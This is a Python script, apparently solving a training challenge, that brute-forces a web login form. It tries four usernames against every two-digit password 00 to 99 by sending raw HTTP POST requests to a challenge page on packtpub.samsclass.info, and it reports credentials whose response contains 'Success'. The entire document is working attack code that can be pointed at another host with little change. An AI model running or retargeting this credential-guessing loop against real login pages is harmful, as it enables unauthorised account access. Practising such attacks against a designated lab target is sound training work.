import socket

target = 'packtpub.samsclass.info'

for un in ['bill', 'ted', 'sally', 'sue']:
	s = socket.socket()
	s.settimeout(5)
	s.connect((target, 80))
	for pw in range(100):
		req = """POST /http/chal1.php HTTP/1.1
Host: packtpub.samsclass.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://packtpub.samsclass.info/http/chal1.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: {length}
Connection: keep-alive
Upgrade-Insecure-Requests: 1

u={un}&p={pw}"""
		length = len(un) + 2 + 5

		req = req.format(length = length, un = un, pw = str(pw).zfill(2))
		#print('Request:\n', req)
		#sent = False
#		while not sent:
#			try:
#				s.send(req.encode('utf-8'))
#				cnt += 1
#				if cnt == 100:
#					cnt = 0
#					s.close()
#					s = socket.socket()
#					s.settimeout(2)
#				res = s.recv(1024).decode('utf-8')
#				print (un, pw)
#				if "Successful Login" in res:
#					print(un, ' & ', pw)
#				sent = True
#			except Exception as e:
#				print(e)
		s.send(req.encode('utf-8'))
		resb = s.recv(1024)
		res = resb.decode('utf-8')
		print (un, pw)
		#print (res)
		if "Success" in res:
			print("Successfull with:", un, ' & ', pw)
		#print('Response:\n')
		#print(s.recv(1024).decode('utf-8'))
		
	s.close()



